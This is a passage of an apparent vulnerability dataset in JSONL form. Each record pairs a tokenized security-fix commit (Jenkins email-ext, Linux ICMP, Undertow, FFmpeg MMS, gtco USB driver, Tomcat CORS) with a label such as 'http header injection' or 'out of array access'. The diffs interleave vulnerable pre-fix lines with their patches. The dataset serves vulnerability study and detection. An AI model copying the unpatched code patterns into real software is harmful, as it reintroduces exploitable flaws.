"new", "ArrayList", "<", ">(", ");", "Run", "<", "?,", "?", ">", "build", "=", "run", ";", "@", "@", "-", "73", ",", "7", "+", "73", ",", "7", "@", "@", "public", "void", "send", "(", "final", "String", "format", ",", "final", "Object", ".", "..", "args", ")", "{", "build", "=", "build", ".", "getPreviousCompletedBuild", "(", ");", "}", "Set", "<", "User", ">", "users", "=", "RecipientProviderUtilities", ".", "getChangeSetAuthors", "(", "builds", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ".", "getListener", "(", "),", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "}", "@", "@", "-", "40", ",", "7", "+", "40", ",", "7", "@", "@", "public", "void", "send", "(", "final", "String", "format", ",", "final", "Object", ".", "..", "args", ")", "{", "}", "final", "Debug", "debug", "=", "new", "Debug", "(", ");", "Set", "<", "User", ">", "users", "=", "RecipientProviderUtilities", ".", "getChangeSetAuthors", "(", "Collections", ".", "<", "Run", "<", "?,", "?", ">>", "singleton", "(", "context", ".", "getRun", "(", "))", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ".", "getListener", "(", "),", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "@", "Extension", "@", "@", "-", "137", ",", "7", "+", "137", ",", "7", "@", "@", "public", "void", "send", "(", "final", "String", "format", ",", "final", "Object", ".", "..", "args", ")", "{", "}", "if", "(", "users", "!", "=", "null", ")", "{", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ".", "getListener", "(", "),", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "}", "@", "@", "-", "101", ",", "7", "+", "101", ",", "7", "@", "@", "public", "void", "send", "(", "final", "String", "format", ",", "final", "Object", ".", "..", "args", ")", "{", "}", "}", "if", "(", "users", "!", "=", "null", ")", "{", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ".", "getListener", "(", "),", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "users", ",", "context", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "}", "@", "@", "-", "28", ",", "11", "+", "28", ",", "14", "@", "@", "import", "hudson", ".", "EnvVars", ";", "import", "hudson", ".", "model", ".", "AbstractBuild", ";", "import", "hudson", ".", "model", ".", "Cause", ";", "import", "hudson", ".", "model", ".", "Item", ";", "import", "hudson", ".", "model", ".", "Run", ";", "import", "hudson", ".", "model", ".", "TaskListener", ";", "import", "hudson", ".", "model", ".", "User", ";", "import", "hudson", ".", "plugins", ".", "emailext", ".", "EmailRecipientUtils", ";", "import", "hudson", ".", "plugins", ".", "emailext", ".", "ExtendedEmailPublisherContext", ";", "import", "hudson", ".", "scm", ".", "ChangeLogSet", ";", "import", "hudson", ".", "tasks", ".", "MailSender", ";", "import", "javax", ".", "mail", ".", "internet", ".", "InternetAddress", ";", "import", "java", ".", "lang", ".", "reflect", ".", "Field", ";", "@", "@", "-", "43", ",", "6", "+", "46", ",", "9", "@", "@", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "import", "javax", ".", "annotation", ".", "CheckForNull", ";", "import", "org", ".", "acegisecurity", ".", "Authentication", ";", "import", "org", ".", "acegisecurity", ".", "userdetails", ".", "UsernameNotFoundException", ";", "public", "final", "class", "RecipientProviderUtilities", "{", "private", "static", "final", "Logger", "LOGGER", "=", "Logger", ".", "getLogger", "(", "RecipientProviderUtilities", ".", "class", ".", "getName", "(", "))", ";", "@", "@", "-", "153", ",", "14", "+", "159", ",", "48", "@", "@", "public", "static", "User", "getUserTriggeringTheBuild", "(", "final", "Run", "<", "?,", "?", ">", "run", ")", "{", "return", "user", ";", "}", "@", "Deprecated", "public", "static", "void", "addUsers", "(", "final", "Set", "<", "User", ">", "users", ",", "final", "TaskListener", "listener", ",", "final", "EnvVars", "env", ",", "final", "Set", "<", "InternetAddress", ">", "to", ",", "final", "Set", "<", "InternetAddress", ">", "cc", ",", "final", "Set", "<", "InternetAddress", ">", "bcc", ",", "final", "IDebug", "debug", ")", "{", "addUsers", "(", "users", ",", "listener", ",", "null", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "public", "static", "void", "addUsers", "(", "final", "Set", "<", "User", ">", "users", ",", "final", "ExtendedEmailPublisherContext", "context", ",", "final", "EnvVars", "env", ",", "final", "Set", "<", "InternetAddress", ">", "to", ",", "final", "Set", "<", "InternetAddress", ">", "cc", ",", "final", "Set", "<", "InternetAddress", ">", "bcc", ",", "final", "IDebug", "debug", ")", "{", "addUsers", "(", "users", ",", "context", ".", "getListener", "(", "),", "context", ".", "getRun", "(", "),", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "/", "**", "If", "set", ",", "send", "to", "known", "users", "who", "lack", "{", "@", "link", "Item", "#", "READ", "}", "access", "to", "the", "job", ".", "*", "/", "static", "/", "*", "not", "final", "*", "/", "boolean", "SEND_TO_USERS_WITHOUT_READ", "=", "Boolean", ".", "getBoolean", "(", "MailSender", ".", "class", ".", "getName", "(", ")", "+", "\"", ".", "SEND_TO_USERS_WITHOUT_READ", "\"", ");", "/", "**", "If", "set", ",", "send", "to", "unknown", "users", ".", "*", "/", "static", "/", "*", "not", "final", "*", "/", "boolean", "SEND_TO_UNKNOWN_USERS", "=", "Boolean", ".", "getBoolean", "(", "MailSender", ".", "class", ".", "getName", "(", ")", "+", "\"", ".", "SEND_TO_UNKNOWN_USERS", "\"", ");", "private", "static", "void", "addUsers", "(", "final", "Set", "<", "User", ">", "users", ",", "final", "TaskListener", "listener", ",", "@", "CheckForNull", "Run", "<", "?,", "?>", "run", ",", "final", "EnvVars", "env", ",", "final", "Set", "<", "InternetAddress", ">", "to", ",", "final", "Set", "<", "InternetAddress", ">", "cc", ",", "final", "Set", "<", "InternetAddress", ">", "bcc", ",", "final", "IDebug", "debug", ")", "{", "for", "(", "final", "User", "user", ":", "users", ")", "{", "if", "(", "EmailRecipientUtils", ".", "isExcludedRecipient", "(", "user", ",", "listener", ")", ")", "{", "debug", ".", "send", "(", "\"", "User", "%", "s", "is", "an", "excluded", "recipient", ".", "\",", "user", ".", "getFullName", "(", "))", ";", "}", "else", "{", "final", "String", "userAddress", "=", "EmailRecipientUtils", ".", "getUserConfiguredEmail", "(", "user", ")", ";", "if", "(", "userAddress", "!", "=", "null", ")", "{", "try", "{", "Authentication", "auth", "=", "user", ".", "impersonate", "(", ");", "if", "(", "run", "!", "=", "null", "&", "&", "!", "run", ".", "getACL", "(", ").", "hasPermission", "(", "auth", ",", "Item", ".", "READ", ")", ")", "{", "if", "(", "SEND_TO_USERS_WITHOUT_READ", ")", "{", "listener", ".", "getLogger", "(", ").", "printf", "(", "\"", "Warning", ":", "user", "%", "s", "has", "no", "permission", "to", "view", "%", "s", ",", "but", "sending", "mail", "anyway", "%", "n", "\"", ",", "userAddress", ",", "run", ".", "getFullDisplayName", "(", "))", ";", "}", "else", "{", "listener", ".", "getLogger", "(", ").", "printf", "(", "\"", "Not", "sending", "mail", "to", "user", "%", "s", "with", "no", "permission", "to", "view", "%", "s", "\"", ",", "userAddress", ",", "run", ".", "getFullDisplayName", "(", "))", ";", "continue", ";", "}", "}", "}", "catch", "(", "UsernameNotFoundException", "x", ")", "{", "if", "(", "SEND_TO_UNKNOWN_USERS", ")", "{", "listener", ".", "getLogger", "(", ").", "printf", "(", "\"", "Warning", ":", "%", "s", "is", "not", "a", "recognized", "user", ",", "but", "sending", "mail", "anyway", "%", "n", "\"", ",", "userAddress", ")", ";", "}", "else", "{", "listener", ".", "getLogger", "(", ").", "printf", "(", "\"", "Not", "sending", "mail", "to", "unregistered", "user", "%", "s", "%", "n", "\"", ",", "userAddress", ")", ";", "continue", ";", "}", "}", "debug", ".", "send", "(", "\"", "Adding", "%", "s", "with", "address", "%", "s", "\"", ",", "user", ".", "getFullName", "(", "),", "userAddress", ")", ";", "EmailRecipientUtils", ".", "addAddressesFromRecipientList", "(", "to", ",", "cc", ",", "bcc", ",", "userAddress", ",", "env", ",", "listener", ")", ";", "}", "else", "{", "@", "@", "-", "55", ",", "15", "+", "55", ",", "15", "@", "@", "public", "void", "send", "(", "final", "String", "format", ",", "final", "Object", ".", "..", "args", ")", "{", "cur", "=", "p", ".", "getBuildByNumber", "(", "upc", ".", "getUpstreamBuild", "(", "))", ";", "upc", "=", "cur", ".", "getCause", "(", "Cause", ".", "UpstreamCause", ".", "class", ")", ";", "}", "addUserTriggeringTheBuild", "(", "cur", ",", "to", ",", "cc", ",", "bcc", ",", "env", ",", "context", ".", "getListener", "(", "),", "debug", ")", ";", "addUserTriggeringTheBuild", "(", "cur", ",", "to", ",", "cc", ",", "bcc", ",", "env", ",", "context", ",", "debug", ")", ";", "}", "private", "static", "void", "addUserTriggeringTheBuild", "(", "Run", "<", "?,", "?", ">", "run", ",", "Set", "<", "InternetAddress", ">", "to", ",", "Set", "<", "InternetAddress", ">", "cc", ",", "Set", "<", "InternetAddress", ">", "bcc", ",", "EnvVars", "env", ",", "TaskListener", "listener", ",", "RecipientProviderUtilities", ".", "IDebug", "debug", ")", "{", "Set", "<", "InternetAddress", ">", "cc", ",", "Set", "<", "InternetAddress", ">", "bcc", ",", "EnvVars", "env", ",", "final", "ExtendedEmailPublisherContext", "context", ",", "RecipientProviderUtilities", ".", "IDebug", "debug", ")", "{", "final", "User", "user", "=", "RecipientProviderUtilities", ".", "getUserTriggeringTheBuild", "(", "run", ")", ";", "if", "(", "user", "!", "=", "null", ")", "{", "RecipientProviderUtilities", ".", "addUsers", "(", "Collections", ".", "singleton", "(", "user", ")", ",", "listener", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "Collections", ".", "singleton", "(", "user", ")", ",", "context", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "}", "@", "@", "-", "6", ",", "7", "+", "6", ",", "6", "@", "@", "import", "hudson", ".", "model", ".", "Cause", ";", "import", "hudson", ".", "model", ".", "Job", ";", "import", "hudson", ".", "model", ".", "Run", ";", "import", "hudson", ".", "model", ".", "TaskListener", ";", "import", "hudson", ".", "model", ".", "User", ";", "import", "hudson", ".", "plugins", ".", "emailext", ".", "ExtendedEmailPublisherContext", ";", "import", "hudson", ".", "plugins", ".", "emailext", ".", "ExtendedEmailPublisherDescriptor", ";", "@", "@", "-", "60", ",", "7", "+", "59", ",", "7", "@", "@", "public", "void", "send", "(", "final", "String", "format", ",", "final", "Object", ".", "..", "args", ")", "{", "}", "cur", "=", "p", ".", "getBuildByNumber", "(", "upc", ".", "getUpstreamBuild", "(", "))", ";", "upc", "=", "cur", ".", "getCause", "(", "Cause", ".", "UpstreamCause", ".", "class", ")", ";", "addUpstreamCommittersTriggeringBuild", "(", "cur", ",", "to", ",", "cc", ",", "bcc", ",", "env", ",", "context", ".", "getListener", "(", "),", "debug", ")", ";", "addUpstreamCommittersTriggeringBuild", "(", "cur", ",", "to", ",", "cc", ",", "bcc", ",", "env", ",", "context", ",", "debug", ")", ";", "}", "}", "@", "@", "-", "74", ",", "7", "+", "73", ",", "7", "@", "@", "public", "void", "send", "(", "final", "String", "format", ",", "final", "Object", ".", "..", "args", ")", "{", "*", "@", "param", "env", "*", "@", "param", "listener", "*", "/", "private", "void", "addUpstreamCommittersTriggeringBuild", "(", "Run", "<", "?,", "?", ">", "build", ",", "Set", "<", "InternetAddress", ">", "to", ",", "Set", "<", "InternetAddress", ">", "cc", ",", "Set", "<", "InternetAddress", ">", "bcc", ",", "EnvVars", "env", ",", "TaskListener", "listener", ",", "RecipientProviderUtilities", ".", "IDebug", "debug", ")", "{", "private", "void", "addUpstreamCommittersTriggeringBuild", "(", "Run", "<", "?,", "?", ">", "build", ",", "Set", "<", "InternetAddress", ">", "to", ",", "Set", "<", "InternetAddress", ">", "cc", ",", "Set", "<", "InternetAddress", ">", "bcc", ",", "EnvVars", "env", ",", "final", "ExtendedEmailPublisherContext", "context", ",", "RecipientProviderUtilities", ".", "IDebug", "debug", ")", "{", "debug", ".", "send", "(", "\"", "Adding", "upstream", "committer", "from", "job", "%", "s", "with", "build", "number", "%", "s", "\"", ",", "build", ".", "getParent", "(", ").", "getDisplayName", "(", "),", "build", ".", "getNumber", "(", "))", ";", "List", "<", "ChangeLogSet", "<", "?>", ">", "changeSets", "=", "new", "ArrayList", "<", ">(", ");", "@", "@", "-", "87", ",", "14", "+", "86", ",", "14", "@", "@", "private", "void", "addUpstreamCommittersTriggeringBuild", "(", "Run", "<", "?,", "?", ">", "build", ",", "Set", "<", "InternetA", "Method", "m", "=", "build", ".", "getClass", "(", ").", "getMethod", "(", "\"", "getChangeSets", "\"", ");", "changeSets", "=", "(", "List", "<", "ChangeLogSet", "<", "?", "extends", "ChangeLogSet", ".", "Entry", ">", ">)", "m", ".", "invoke", "(", "build", ")", ";", "}", "catch", "(", "NoSuchMethodException", "|", "InvocationTargetException", "|", "IllegalAccessException", "e", ")", "{", "listener", ".", "getLogger", "(", ").", "print", "(", "\"", "Could", "not", "add", "upstream", "committers", ",", "build", "type", "does", "not", "provide", "change", "set", "\"", ");", "context", ".", "getListener", "(", ").", "getLogger", "(", ").", "print", "(", "\"", "Could", "not", "add", "upstream", "committers", ",", "build", "type", "does", "not", "provide", "change", "set", "\"", ");", "}", "}", "if", "(", "!", "changeSets", ".", "isEmpty", "(", "))", "{", "for", "(", "ChangeLogSet", "<", "?", "extends", "ChangeLogSet", ".", "Entry", ">", "changeSet", ":", "changeSets", ")", "{", "for", "(", "ChangeLogSet", ".", "Entry", "change", ":", "changeSet", ")", "{", "addUserFromChangeSet", "(", "change", ",", "to", ",", "cc", ",", "bcc", ",", "env", ",", "listener", ",", "debug", ")", ";", "addUserFromChangeSet", "(", "change", ",", "to", ",", "cc", ",", "bcc", ",", "env", ",", "context", ",", "debug", ")", ";", "}", "}", "}", "@", "@", "-", "109", ",", "9", "+", "108", ",", "9", "@", "@", "private", "void", "addUpstreamCommittersTriggeringBuild", "(", "Run", "<", "?,", "?", ">", "build", ",", "Set", "<", "InternetA", "*", "@", "param", "env", "The", "build", "environment", "*", "@", "param", "listener", "The", "listener", "for", "logging", "*", "/", "private", "void", "addUserFromChangeSet", "(", "ChangeLogSet", ".", "Entry", "change", ",", "Set", "<", "InternetAddress", ">", "to", ",", "Set", "<", "InternetAddress", ">", "cc", ",", "Set", "<", "InternetAddress", ">", "bcc", ",", "EnvVars", "env", ",", "TaskListener", "listener", ",", "RecipientProviderUtilities", ".", "IDebug", "debug", ")", "{", "private", "void", "addUserFromChangeSet", "(", "ChangeLogSet", ".", "Entry", "change", ",", "Set", "<", "InternetAddress", ">", "to", ",", "Set", "<", "InternetAddress", ">", "cc", ",", "Set", "<", "InternetAddress", ">", "bcc", ",", "EnvVars", "env", ",", "final", "ExtendedEmailPublisherContext", "context", ",", "RecipientProviderUtilities", ".", "IDebug", "debug", ")", "{", "User", "user", "=", "change", ".", "getAuthor", "(", ");", "RecipientProviderUtilities", ".", "addUsers", "(", "Collections", ".", "singleton", "(", "user", ")", ",", "listener", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "RecipientProviderUtilities", ".", "addUsers", "(", "Collections", ".", "singleton", "(", "user", ")", ",", "context", ",", "env", ",", "to", ",", "cc", ",", "bcc", ",", "debug", ")", ";", "}", "@", "Extension"], "docstring_tokens": ["information", "exposure"]}
{"contents": ["[ICMP]:", "Dst", "entry", "leak", "in", "icmp_send", "host", "re-lookup", "code", "(v2).", "Commit", "8b7817f3a959ed99d7443afc12f78a7e1fcc2063", "([IPSEC]:", "Add", "ICMP", "host", "relookup", "support)", "introduced", "some", "dst", "leaks", "on", "error", "paths:", "the", "rt", "pointer", "can", "be", "forgotten", "to", "be", "put.", "Fix", "it", "bu", "going", "to", "a", "proper", "label.", "Found", "after", "net", "namespace's", "lo", "refused", "to", "unregister", ":)", "Many", "thanks", "to", "Den", "for", "valuable", "help", "during", "debugging.", "Herbert", "pointed", "out,", "that", "xfrm_lookup()", "will", "put", "the", "rtable", "in", "case", "of", "error", "itself,", "so", "the", "first", "goto", "fix", "is", "redundant.", "Signed-off-by:", "Pavel", "Emelyanov", "<xemul@openvz.org>", "Signed-off-by:", "Denis", "V.", "Lunev", "<den@openvz.org>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "591", ",", "7", "+", "591", ",", "7", "@", "@", "void", "icmp_send", "(", "struct", "sk_buff", "*", "skb_in", ",", "int", "type", ",", "int", "code", ",", "__be32", "info", ")", "}", "if", "(", "xfrm_decode_session_reverse", "(", "skb_in", ",", "&", "fl", ",", "AF_INET", ")", ")", "goto", "out_unlock", ";", "goto", "ende", ";", "if", "(", "inet_addr_type", "(", "net", ",", "fl", ".", "fl4_src", ")", "=", "=", "RTN_LOCAL", ")", "err", "=", "__ip_route_output_key", "(", "net", ",", "&", "rt2", ",", "&", "fl", ")", ";", "@", "@", "-", "601", ",", "7", "+", "601", ",", "7", "@", "@", "void", "icmp_send", "(", "struct", "sk_buff", "*", "skb_in", ",", "int", "type", ",", "int", "code", ",", "__be32", "info", ")", "fl2", ".", "fl4_dst", "=", "fl", ".", "fl4_src", ";", "if", "(", "ip_route_output_key", "(", "net", ",", "&", "rt2", ",", "&", "fl2", ")", ")", "goto", "out_unlock", ";", "goto", "ende", ";", "/", "*", "Ugh", "!", "*", "/", "odst", "=", "skb_in", "-", ">", "dst", ";", "@", "@", "-", "614", ",", "7", "+", "614", ",", "7", "@", "@", "void", "icmp_send", "(", "struct", "sk_buff", "*", "skb_in", ",", "int", "type", ",", "int", "code", ",", "__be32", "info", ")", "}", "if", "(", "err", ")", "goto", "out_unlock", ";", "goto", "ende", ";", "err", "=", "xfrm_lookup", "(", "(", "struct", "dst_entry", "*", "*)", "&", "rt2", ",", "&", "fl", ",", "NULL", ",", "XFRM_LOOKUP_ICMP", ")", ";"], "docstring_tokens": ["cache", "overflow"]}
{"contents": ["UNDERTOW-1302", "Fix", "response", "splitting", "flaw", "if", "headers", "contain", "non-ascii", "characters"], "code_tokens": ["@", "@", "-", "294", ",", "8", "+", "294", ",", "9", "@", "@", "private", "static", "void", "writeString", "(", "ByteBuffer", "buffer", ",", "String", "string", ")", "{", "int", "length", "=", "string", ".", "length", "(", ");", "for", "(", "int", "charIndex", "=", "0", ";", "charIndex", "<", "length", ";", "charIndex", "+", "+)", "{", "char", "c", "=", "string", ".", "charAt", "(", "charIndex", ")", ";", "if", "(", "c", "!", "=", "'", "\\", "r", "'", "&", "&", "c", "!", "=", "'", "\\", "n", "'", ")", "{", "buffer", ".", "put", "(", "(", "byte", ")", "c", ")", ";", "byte", "b", "=", "(", "byte", ")", "c", ";", "if", "(", "b", "!", "=", "'", "\\", "r", "'", "&", "&", "b", "!", "=", "'", "\\", "n", "'", ")", "{", "buffer", ".", "put", "(", "b", ")", ";", "}", "else", "{", "buffer", ".", "put", "(", "(", "byte", ")", "'", "'", ");", "}"], "docstring_tokens": ["http", "header", "injection"]}
{"contents": ["avformat/mms:", "Add", "missing", "chunksize", "check", "Fixes:", "out", "of", "array", "read", "Fixes:", "mms-crash-01b6c5d85f9d9f40f4e879896103e9f5b222816a", "Found-by:", "Paul", "Ch", "<paulcher@icloud.com>", "1st", "hunk", "by", "Paul", "Ch", "<paulcher@icloud.com>", "Tested-by:", "Paul", "Ch", "<paulcher@icloud.com>", "Signed-off-by:", "Michael", "Niedermayer", "<michael@niedermayer.cc>"], "code_tokens": ["@", "@", "-", "94", ",", "24", "+", "94", ",", "26", "@", "@", "int", "ff_mms_asf_header_parser", "(", "MMSContext", "*", "mms", ")", "}", "}", "}", "else", "if", "(", "!", "memcmp", "(", "p", ",", "ff_asf_stream_header", ",", "sizeof", "(", "ff_asf_guid", ")", "))", "{", "flags", "=", "AV_RL16", "(", "p", "+", "sizeof", "(", "ff_asf_guid", ")", "*", "3", "+", "24", ")", ";", "stream_id", "=", "flags", "&", "0x7F", ";", "/", "/", "The", "second", "condition", "is", "for", "checking", "CS_PKT_STREAM_ID_REQUEST", "packet", "size", ",", "/", "/", "we", "can", "calculate", "the", "packet", "size", "by", "stream_num", ".", "/", "/", "Please", "see", "function", "send_stream_selection_request", "(", ").", "if", "(", "mms", "-", ">", "stream_num", "<", "MMS_MAX_STREAMS", "&", "&", "46", "+", "mms", "-", ">", "stream_num", "*", "6", "<", "sizeof", "(", "mms", "-", ">", "out_buffer", ")", ")", "{", "mms", "-", ">", "streams", "=", "av_fast_realloc", "(", "mms", "-", ">", "streams", ",", "&", "mms", "-", ">", "nb_streams_allocated", ",", "(", "mms", "-", ">", "stream_num", "+", "1", ")", "*", "sizeof", "(", "MMSStream", ")", ");", "if", "(", "!", "mms", "-", ">", "streams", ")", "return", "AVERROR", "(", "ENOMEM", ")", ";", "mms", "-", ">", "streams", "[", "mms", "-", ">", "stream_num", "]", ".", "id", "=", "stream_id", ";", "mms", "-", ">", "stream_num", "+", "+;", "}", "else", "{", "av_log", "(", "NULL", ",", "AV_LOG_ERROR", ",", "\"", "Corrupt", "stream", "(", "too", "many", "A", "/", "V", "streams", ")", "\\", "n", "\"", ");", "return", "AVERROR_INVALIDDATA", ";", "if", "(", "end", "-", "p", ">", "=", "(", "sizeof", "(", "ff_asf_guid", ")", "*", "3", "+", "26", ")", ")", "{", "flags", "=", "AV_RL16", "(", "p", "+", "sizeof", "(", "ff_asf_guid", ")", "*", "3", "+", "24", ")", ";", "stream_id", "=", "flags", "&", "0x7F", ";", "/", "/", "The", "second", "condition", "is", "for", "checking", "CS_PKT_STREAM_ID_REQUEST", "packet", "size", ",", "/", "/", "we", "can", "calculate", "the", "packet", "size", "by", "stream_num", ".", "/", "/", "Please", "see", "function", "send_stream_selection_request", "(", ").", "if", "(", "mms", "-", ">", "stream_num", "<", "MMS_MAX_STREAMS", "&", "&", "46", "+", "mms", "-", ">", "stream_num", "*", "6", "<", "sizeof", "(", "mms", "-", ">", "out_buffer", ")", ")", "{", "mms", "-", ">", "streams", "=", "av_fast_realloc", "(", "mms", "-", ">", "streams", ",", "&", "mms", "-", ">", "nb_streams_allocated", ",", "(", "mms", "-", ">", "stream_num", "+", "1", ")", "*", "sizeof", "(", "MMSStream", ")", ");", "if", "(", "!", "mms", "-", ">", "streams", ")", "return", "AVERROR", "(", "ENOMEM", ")", ";", "mms", "-", ">", "streams", "[", "mms", "-", ">", "stream_num", "]", ".", "id", "=", "stream_id", ";", "mms", "-", ">", "stream_num", "+", "+;", "}", "else", "{", "av_log", "(", "NULL", ",", "AV_LOG_ERROR", ",", "\"", "Corrupt", "stream", "(", "too", "many", "A", "/", "V", "streams", ")", "\\", "n", "\"", ");", "return", "AVERROR_INVALIDDATA", ";", "}", "}", "}", "else", "if", "(", "!", "memcmp", "(", "p", ",", "ff_asf_ext_stream_header", ",", "sizeof", "(", "ff_asf_guid", ")", "))", "{", "if", "(", "end", "-", "p", ">", "=", "88", ")", "{", "@", "@", "-", "143", ",", "6", "+", "145", ",", "12", "@", "@", "int", "ff_mms_asf_header_parser", "(", "MMSContext", "*", "mms", ")", "}", "}", "else", "if", "(", "!", "memcmp", "(", "p", ",", "ff_asf_head1_guid", ",", "sizeof", "(", "ff_asf_guid", ")", "))", "{", "chunksize", "=", "46", ";", "/", "/", "see", "references", "[", "2", "]", "section", "3", ".", "4", ".", "This", "should", "be", "set", "46", ".", "if", "(", "chunksize", ">", "end", "-", "p", ")", "{", "av_log", "(", "NULL", ",", "AV_LOG_ERROR", ",", "\"", "Corrupt", "stream", "(", "header", "chunksize", "%", "\"", "PRId64", "\"", "is", "invalid", ")", "\\", "n", "\"", ",", "chunksize", ")", ";", "return", "AVERROR_INVALIDDATA", ";", "}", "}", "p", "+", "=", "chunksize", ";", "}"], "docstring_tokens": ["out", "of", "array", "access"]}
{"contents": ["Input:", "gtco", "-", "fix", "crash", "on", "detecting", "device", "without", "endpoints", "The", "gtco", "driver", "expects", "at", "least", "one", "valid", "endpoint.", "If", "given", "malicious", "descriptors", "that", "specify", "0", "for", "the", "number", "of", "endpoints,", "it", "will", "crash", "in", "the", "probe", "function.", "Ensure", "there", "is", "at", "least", "one", "endpoint", "on", "the", "interface", "before", "using", "it.", "Also", "let's", "fix", "a", "minor", "coding", "style", "issue.", "The", "full", "correct", "report", "of", "this", "issue", "can", "be", "found", "in", "the", "public", "Red", "Hat", "Bugzilla:", "https://bugzilla.redhat.com/show_bug.cgi?id=1283385", "Reported-by:", "Ralf", "Spenneberg", "<ralf@spenneberg.net>", "Signed-off-by:", "Vladis", "Dronov", "<vdronov@redhat.com>", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Dmitry", "Torokhov", "<dmitry.torokhov@gmail.com>"], "code_tokens": ["@", "@", "-", "858", ",", "6", "+", "858", ",", "14", "@", "@", "static", "int", "gtco_probe", "(", "struct", "usb_interface", "*", "usbinterface", ",", "goto", "err_free_buf", ";", "}", "/", "*", "Sanity", "check", "that", "a", "device", "has", "an", "endpoint", "*", "/", "if", "(", "usbinterface", "-", ">", "altsetting", "[", "0", "]", ".", "desc", ".", "bNumEndpoints", "<", "1", ")", "{", "dev_err", "(", "&", "usbinterface", "-", ">", "dev", ",", "\"", "Invalid", "number", "of", "endpoints", "\\", "n", "\"", ");", "error", "=", "-", "EINVAL", ";", "goto", "err_free_urb", ";", "}", "/", "*", "*", "The", "endpoint", "is", "always", "altsetting", "0", ",", "we", "know", "this", "since", "we", "know", "*", "this", "device", "only", "has", "one", "interrupt", "endpoint", "@", "@", "-", "879", ",", "7", "+", "887", ",", "7", "@", "@", "static", "int", "gtco_probe", "(", "struct", "usb_interface", "*", "usbinterface", ",", "*", "HID", "report", "descriptor", "*", "/", "if", "(", "usb_get_extra_descriptor", "(", "usbinterface", "-", ">", "cur_altsetting", ",", "HID_DEVICE_TYPE", ",", "&", "hid_desc", ")", "!", "=", "0", ")", "{", "HID_DEVICE_TYPE", ",", "&", "hid_desc", ")", "!", "=", "0", ")", "{", "dev_err", "(", "&", "usbinterface", "-", ">", "dev", ",", "\"", "Can", "'", "t", "retrieve", "exta", "USB", "descriptor", "to", "get", "hid", "report", "descriptor", "length", "\\", "n", "\"", ");", "error", "=", "-", "EIO", ";"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["BZ61101:", "CORS", "filter", "should", "set", "Vary", "header", "in", "response.", "Submitted", "by", "Rick", "Riemer.", "git-svn-id:", "https://svn.apache.org/repos/asf/tomcat/trunk@1795813", "13f79535-47bb-0310-9956-ffa450edef68"], "code_tokens": ["@", "@", "-", "277", ",", "6", "+", "277", ",", "10", "@", "@", "protected", "void", "handleSimpleCORS", "(", "final", "HttpServletRequest", "request", ",", "exposedHeadersString", ")", ";", "}", "/", "/", "Indicate", "the", "response", "depends", "on", "the", "origin", "response", ".", "addHeader", "(", "CorsFilter", ".", "REQUEST_HEADER_VARY", ",", "CorsFilter", ".", "REQUEST_HEADER_ORIGIN", ")", ";", "/", "/", "Forward", "the", "request", "down", "the", "filter", "chain", ".", "filterChain", ".", "doFilter", "(", "request", ",", "response", ")", ";", "}", "@", "@", "-", "966", ",", "6", "+", "970", ",", "13", "@", "@", "public", "long", "getPreflightMaxAge", "(", ")", "{", "\"", "Access", "-", "Control", "-", "Allow", "-", "Headers", "\"", ";", "/", "/", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-", "CORS", "Request", "Headers", "/", "**", "*", "The", "Vary", "header", "indicates", "allows", "disabling", "proxy", "caching", "by", "indicating", "*", "the", "the", "response", "depends", "on", "the", "origin", ".", "*", "/", "public", "static", "final", "String", "REQUEST_HEADER_VARY", "=", "\"", "Vary", "\"", ";", "/", "**", "*", "The", "Origin", "header", "indicates", "where", "the", "cross", "-", "origin", "request", "or", "preflight", "*", "request", "originates", "from", ".", "@", "@", "-", "57", ",", "6", "+", "57", ",", "10", "@", "@", "<", "code", ">", "o", ".", "a", ".", "c", ".", "connector", ".", "CoyoteAdapter", "#", "parseSessionCookiesId", "<", "/", "code", ">", ".", "Patch", "provided", "by", "John", "Andrew", "(", "XUZHOUWANG", ")", "via", "Github", ".", "(", "violetagg", ")", "<", "/", "fix", ">", "<", "fix", ">", "<", "bug", ">", "61101", "<", "/", "bug", ">", ":", "CORS", "filter", "should", "set", "Vary", "header", "in", "response", ".", "Submitted", "by", "Rick", "Riemer", ".", "(", "remm", ")", "<", "/", "fix", ">", "<", "/", "changelog", ">", "<", "/", "subsection", ">", "<", "subsection", "name", "=", "\"", "Coyote", "\"", ">"], "docstring_tokens": ["cache", "poisoning"]}
